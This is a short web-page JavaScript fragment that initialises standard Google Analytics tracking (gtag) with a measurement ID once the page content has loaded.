document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'G-V0V53P7YVQ'); }); </script>
